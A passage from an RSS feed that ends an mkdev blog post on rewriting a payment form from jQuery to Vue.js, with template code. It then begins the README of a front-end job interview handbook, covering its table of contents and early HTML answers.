        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;setPrice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;getStripeToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;showFinalForm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;toggleViews&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;created&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setPrice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the template we indicate where to output these properties and which method to request with which action. For example:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payment__button button button--centered&quot;&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;v-bind:class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[can_proceed_to_final_form ? '' : 'button--disabled']&quot;&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;v-if=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;!final_form_visible&quot;&lt;/span&gt;
   &lt;span class=&quot;na&quot;&gt;v-on:click&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prevent=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;showFinalForm&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= t &quot;.enroll_for&quot;, price: &quot;{{price}}&quot; %&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;! --- &amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;template&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;v-if=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;final_form_visible&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payment__notice payment__notice--centered&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= raw t '.to_continue' %&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= render &quot;login_form&quot; %&amp;gt;
  &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%= link_to t('.cancel'), &quot;#&quot;,
              class: &quot;payment__cancel-link&quot;,
              &quot;v-if&quot; =&amp;gt; &quot;final_form_visible&quot;,
              &quot;v-on:click.prevent&quot; =&amp;gt; &quot;final_form_visible = false&quot; %&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/template&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The elements hide by themselves and are shown according to the component properties and binding events to the elements (clicking the button) is occuring right in the template.&lt;/p&gt;
&lt;h4&gt;It’s not so convenient to reference the components without the webpacker, but it’s not a big deal&lt;/h4&gt;
&lt;p&gt;Ideally, Vue.js components are stored each in a separate.vue file. The template, code and even CSS are also stored here. Leaving the webpacker behind, we (presumably) have lost an ability to do so. Luckily, Vue.js offers some alternative ways to define the component. &lt;a href=&quot;https://vuejs.org/v2/guide/components.html#X-Templates&quot;&gt;X-Templates way&lt;/a&gt; suited us and our system with the assets pipeline perfectly:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/x-template&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payment-form-template&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;payment&quot;&lt;/span&gt;
       &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[upgrade_notice_visible ? 'payment--large' : '']&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Vue.js is very handy to incorporate part by part&lt;/h4&gt;
&lt;p&gt;I’ve already mentioned it a little, but I’d better note that once again: Vue.js doesn’t make you rewrite all the code. We took just one component, a payment form, and used Vue.js. All the rest wasn’t changed.&lt;/p&gt;
&lt;h4&gt;There are millions of plug-ins for Vue.js&lt;/h4&gt;
&lt;p&gt;I was afraid not to find the same amount of ready-made solutions for Vue.js, as I had for jQuery. I shouldn’t have to. It turned out that there were a lot of components for the slider, for the masked input. Having searched the Internet, I also found the components for the datepicker, for the tables and whatnot.&lt;/p&gt;
&lt;h3&gt;Better tomorrow for the mkdev.me front-end&lt;/h3&gt;
&lt;p&gt;Let’s sum it up.&lt;/p&gt;
&lt;p&gt;I managed to rewrite the most complicated front-end component of our project using Vue.js in no time. As a result, the code got simpler, clearer and more supportable. Vue.js is a great, simple and fast tool, which doesn’t make you to learn new architecture. The experience is the same as it was with jQuery: you just code following the simplest rules and it goes pretty well.&lt;/p&gt;
&lt;p&gt;Sure enough, over the time jQuery shoots you in the feet, and maybe Vue.js will, too. But for now it successfully healed the wounds inflicted by its predecessor.&lt;/p&gt;
&lt;p&gt;Of course, we haven’t mastered Vue.js yet. We have also planned a couple of dozens of minor fixes and improvements for our payment form code. Then we’re going to get rid of jQuery step by step and move to Vue.js components completely. Maybe we will even implement Webpack in the end.&lt;/p&gt;
&lt;p&gt;Another bonus from Vue.js is that our mkdev developers are interested in examining it, working with it and implementing it. And this is a new page in the mkdev front-end development.&lt;/p&gt;
</description>
<pubDate>Sun, 11 Feb 2018 14:01:20 +0000</pubDate>
<dc:creator>fodoj</dc:creator>
<og:title>How and why mkdev moved to Vue.js | articles about programming on mkdev</og:title>
<og:description>Until recently, mkdev used jQuery only and a huge pile of plug-ins. But in the fall of 2018 we up and rewrote some part of the frontend in Vue.js. Why? For what? How?</og:description>
<og:image>https://s3.eu-central-1.amazonaws.com/assets-mkdev/posts/covers/000/000/148/original/how-and-why-mkdev-moved-to-Vue-js.png?1518357281</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>https://mkdev.me/en/posts/how-and-why-mkdev-moved-to-vue-js</dc:identifier>
</item>
<item>
<title>Answers to front-end developer job interview questions</title>
<link>https://github.com/yangshun/front-end-interview-handbook</link>
<guid isPermaLink="true" >https://github.com/yangshun/front-end-interview-handbook</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;

&lt;h2&gt;What is this?&lt;/h2&gt;
&lt;p&gt;Unlike typical software engineer job interviews, front-end job interviews have less emphasis on algorithms and have more questions on intricate knowledge and expertise about the domain — HTML, CSS, JavaScript, just to name a few areas.&lt;/p&gt;
&lt;p&gt;While there are some existing resources to help front end developers in preparing for interviews, they aren't as abundant as materials for a software engineer interview. Among the existing resources, probably the most helpful question bank would be &lt;a href=&quot;https://github.com/h5bp/Front-end-Developer-Interview-Questions&quot;&gt;Front-end Developer Interview Questions&lt;/a&gt;. Unfortunately, I couldn't find many complete and satisfactory answers for these questions online, hence here is my attempt at answering them. Being an open source repository, the project can live on with the support of the community as the state of web evolves.&lt;/p&gt;
&lt;h2&gt;Table of Contents&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#html-questions&quot;&gt;HTML Questions&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#css-questions&quot;&gt;CSS Questions&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#js-questions&quot;&gt;JS Questions&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-event-delegation&quot;&gt;Explain event delegation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-how-this-works-in-javascript&quot;&gt;Explain how &lt;code&gt;this&lt;/code&gt; works in JavaScript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-how-prototypal-inheritance-works&quot;&gt;Explain how prototypal inheritance works&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-do-you-think-of-amd-vs-commonjs&quot;&gt;What do you think of AMD vs CommonJS?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-why-the-following-doesnt-work-as-an-iife-function-foo--what-needs-to-be-changed-to-properly-make-it-an-iife&quot;&gt;Explain why the following doesn't work as an IIFE: &lt;code&gt;function foo(){ }();&lt;/code&gt;. What needs to be changed to properly make it an IIFE?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#whats-the-difference-between-a-variable-that-is-null-undefined-or-undeclared-how-would-you-go-about-checking-for-any-of-these-states&quot;&gt;What's the difference between a variable that is: &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;undefined&lt;/code&gt; or undeclared? How would you go about checking for any of these states?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-is-a-closure-and-howwhy-would-you-use-one&quot;&gt;What is a closure, and how/why would you use one?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#can-you-describe-the-main-difference-between-a-foreach-loop-and-a-map-loop-and-why-you-would-pick-one-versus-the-other&quot;&gt;Can you describe the main difference between a &lt;code&gt;.forEach&lt;/code&gt; loop and a &lt;code&gt;.map()&lt;/code&gt; loop and why you would pick one versus the other?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#whats-a-typical-use-case-for-anonymous-functions&quot;&gt;What's a typical use case for anonymous functions?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#how-do-you-organize-your-code-module-pattern-classical-inheritance&quot;&gt;How do you organize your code? (module pattern, classical inheritance?)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#whats-the-difference-between-host-objects-and-native-objects&quot;&gt;What's the difference between host objects and native objects?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#difference-between-function-person-var-person--person-and-var-person--new-person&quot;&gt;Difference between: function &lt;code&gt;Person(){}&lt;/code&gt;, &lt;code&gt;var person = Person()&lt;/code&gt;, and &lt;code&gt;var person = new Person()&lt;/code&gt;?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#whats-the-difference-between-call-and-apply&quot;&gt;What's the difference between &lt;code&gt;.call&lt;/code&gt; and &lt;code&gt;.apply&lt;/code&gt;?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-functionprototypebind&quot;&gt;Explain &lt;code&gt;Function.prototype.bind&lt;/code&gt;.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#when-would-you-use-documentwrite&quot;&gt;When would you use &lt;code&gt;document.write()&lt;/code&gt;?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#whats-the-difference-between-feature-detection-feature-inference-and-using-the-ua-string&quot;&gt;What's the difference between feature detection, feature inference, and using the UA string?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-ajax-in-as-much-detail-as-possible&quot;&gt;Explain Ajax in as much detail as possible.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-are-the-advantages-and-disadvantages-of-using-ajax&quot;&gt;What are the advantages and disadvantages of using Ajax?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-how-jsonp-works-and-how-its-not-really-ajax&quot;&gt;Explain how JSONP works (and how it's not really Ajax).&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#have-you-ever-used-javascript-templating-if-so-what-libraries-have-you-used&quot;&gt;Have you ever used JavaScript templating? If so, what libraries have you used?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-hoisting&quot;&gt;Explain &quot;hoisting&quot;.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#describe-event-bubbling&quot;&gt;Describe event bubbling.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#whats-the-difference-between-an-attribute-and-a-property&quot;&gt;What's the difference between an &quot;attribute&quot; and a &quot;property&quot;?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#why-is-extending-built-in-javascript-objects-not-a-good-idea&quot;&gt;Why is extending built-in JavaScript objects not a good idea?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#difference-between-document-load-event-and-document-domcontentloaded-event&quot;&gt;Difference between document &lt;code&gt;load&lt;/code&gt; event and document &lt;code&gt;DOMContentLoaded&lt;/code&gt; event?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-is-the-difference-between--and-&quot;&gt;What is the difference between &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;===&lt;/code&gt;?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-the-same-origin-policy-with-regards-to-javascript&quot;&gt;Explain the same-origin policy with regards to JavaScript.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#make-this-work&quot;&gt;Make this work: &lt;code&gt;duplicate([1,2,3,4,5]); // [1,2,3,4,5,1,2,3,4,5]&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#why-is-it-called-a-ternary-expression-what-does-the-word-ternary-indicate&quot;&gt;Why is it called a Ternary expression, what does the word &quot;Ternary&quot; indicate?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-is-use-strict-what-are-the-advantages-and-disadvantages-to-using-it&quot;&gt;What is &quot;use strict&quot;;? what are the advantages and disadvantages to using it?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#create-a-for-loop-that-iterates-up-to-100-while-outputting-fizz-at-multiples-of-3-buzz-at-multiples-of-5-and-fizzbuzz-at-multiples-of-3-and-5&quot;&gt;Create a for loop that iterates up to 100 while outputting &quot;fizz&quot; at multiples of 3, &quot;buzz&quot; at multiples of 5 and &quot;fizzbuzz&quot; at multiples of 3 and 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#why-is-it-in-general-a-good-idea-to-leave-the-global-scope-of-a-website-as-is-and-never-touch-it&quot;&gt;Why is it, in general, a good idea to leave the global scope of a website as-is and never touch it?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#why-would-you-use-something-like-the-load-event-does-this-event-have-disadvantages-do-you-know-any-alternatives-and-why-would-you-use-those&quot;&gt;Why would you use something like the &lt;code&gt;load&lt;/code&gt; event? Does this event have disadvantages? Do you know any alternatives, and why would you use those?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-what-a-single-page-app-is-and-how-to-make-one-seo-friendly&quot;&gt;Explain what a single page app is and how to make one SEO-friendly.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-is-the-extent-of-your-experience-with-promises-andor-their-polyfills&quot;&gt;What is the extent of your experience with Promises and/or their polyfills?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-are-the-pros-and-cons-of-using-promises-instead-of-callbacks&quot;&gt;What are the pros and cons of using Promises instead of callbacks?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-are-some-of-the-advantagesdisadvantages-of-writing-javascript-code-in-a-language-that-compiles-to-javascript&quot;&gt;What are some of the advantages/disadvantages of writing JavaScript code in a language that compiles to JavaScript?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-tools-and-techniques-do-you-use-for-debugging-javascript-code&quot;&gt;What tools and techniques do you use debugging JavaScript code?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-language-constructions-do-you-use-for-iterating-over-object-properties-and-array-items&quot;&gt;What language constructions do you use for iterating over object properties and array items?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-the-difference-between-mutable-and-immutable-objects&quot;&gt;Explain the difference between mutable and immutable objects.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-the-difference-between-synchronous-and-asynchronous-functions&quot;&gt;Explain the difference between synchronous and asynchronous functions.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-is-event-loop-what-is-the-difference-between-call-stack-and-task-queue&quot;&gt;What is event loop? What is the difference between call stack and task queue?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#explain-the-differences-on-the-usage-of-foo-between-function-foo--and-var-foo--function-&quot;&gt;Explain the differences on the usage of &lt;code&gt;foo&lt;/code&gt; between &lt;code&gt;function foo() {}&lt;/code&gt; and &lt;code&gt;var foo = function() {}&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-are-the-differences-between-variables-created-using-let-var-or-const&quot;&gt;What are the differences between variables created using &lt;code&gt;let&lt;/code&gt;, &lt;code&gt;var&lt;/code&gt; or &lt;code&gt;const&lt;/code&gt;?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-are-the-differences-between-es6-class-and-es5-function-constructors&quot;&gt;What are the differences between ES6 class and ES5 function constructors?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#can-you-offer-a-use-case-for-the-new-arrow--function-syntax-how-does-this-new-syntax-differ-from-other-functions&quot;&gt;Can you offer a use case for the new arrow =&amp;gt; function syntax? How does this new syntax differ from other functions?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-advantage-is-there-for-using-the-arrow-syntax-for-a-method-in-a-constructor&quot;&gt;What advantage is there for using the arrow syntax for a method in a constructor?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-is-the-definition-of-a-higher-order-function&quot;&gt;What is the definition of a higher-order function?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#can-you-give-an-example-for-destructuring-an-object-or-an-array&quot;&gt;Can you give an example for destructuring an object or an array?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#es6-template-literals-offer-a-lot-of-flexibility-in-generating-strings-can-you-give-an-example&quot;&gt;ES6 Template Literals offer a lot of flexibility in generating strings, can you give an example?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#can-you-give-an-example-of-a-curry-function-and-why-this-syntax-offers-an-advantage&quot;&gt;Can you give an example of a curry function and why this syntax offers an advantage?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#what-are-the-benefits-of-using-spread-syntax-and-how-is-it-different-from-rest-syntax&quot;&gt;What are the benefits of using spread syntax and how is it different from rest syntax?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#how-can-you-share-code-between-files&quot;&gt;How can you share code between files?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yangshun/front-end-interview-handbook#why-you-might-want-to-create-static-class-members&quot;&gt;Why you might want to create static class members?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h2&gt;HTML Questions&lt;/h2&gt;
&lt;p&gt;Answers to &lt;a href=&quot;https://github.com/h5bp/Front-end-Developer-Interview-Questions#html-questions&quot;&gt;Front-end Job Interview Questions - HTML Questions&lt;/a&gt;. Pull requests for suggestions and corrections are welcome!&lt;/p&gt;
&lt;h3&gt;What does a &lt;code&gt;DOCTYPE&lt;/code&gt; do?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;DOCTYPE&lt;/code&gt; is an abbreviation for “document type”. It is a declaration used in HTML to distinguish between standards mode and &lt;a href=&quot;https://quirks.spec.whatwg.org/#history&quot; rel=&quot;nofollow&quot;&gt;quirks mode&lt;/a&gt;. Its presence tells the browser to render the web page in standards mode.&lt;/p&gt;
&lt;p&gt;Moral of the story - just add &lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/code&gt; at the start of your page.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;How do you serve a page with content in multiple languages?&lt;/h3&gt;
&lt;p&gt;The question is a little vague, I will assume that it is asking about the most common case, which is how to serve a page with content available in multiple languages, but the content within the page should be displayed only in one consistent language.&lt;/p&gt;
&lt;p&gt;When an HTTP request is made to a server, the requesting user agent usually sends information about language preferences, such as in the &lt;code&gt;Accept-Language&lt;/code&gt; header. The server can then use this information to return a version of the document in the appropriate language if such an alternative is available. The returned HTML document should also declare the &lt;code&gt;lang&lt;/code&gt; attribute in the &lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt; tag, such as &lt;code&gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;...&amp;lt;/html&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In the back end, the HTML markup will contain &lt;code&gt;i18n&lt;/code&gt; placeholders and content for the specific language stored in YML or JSON formats. The server then dynamically generates the HTML page with content in that particular language, usually with the help of a back end framework.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What kind of things must you be wary of when designing or developing for multilingual sites?&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;lang&lt;/code&gt; attribute in your HTML.&lt;/li&gt;
&lt;li&gt;Directing users to their native language - Allow a user to change his country/language easily without hassle.&lt;/li&gt;
&lt;li&gt;Text in images is not a scalable approach - Placing text in an image is still a popular way to get good-looking, non-system fonts to display on any computer. However to translate image text, each string of text will need to have it's a separate image created for each language. Anything more than a handful of replacements like this can quickly get out of control.&lt;/li&gt;
&lt;li&gt;Restrictive words / sentence length - Some content can be longer when written in another language. Be wary of layout or overflow issues in the design. It's best to avoid designing where the amount of text would make or break a design. Character counts come into play with things like headlines, labels, and buttons. They are less of an issue with free flowing text such as body text or comments.&lt;/li&gt;
&lt;li&gt;Be mindful of how colors are perceived - Colors are perceived differently across languages and cultures. The design should use color appropriately.&lt;/li&gt;
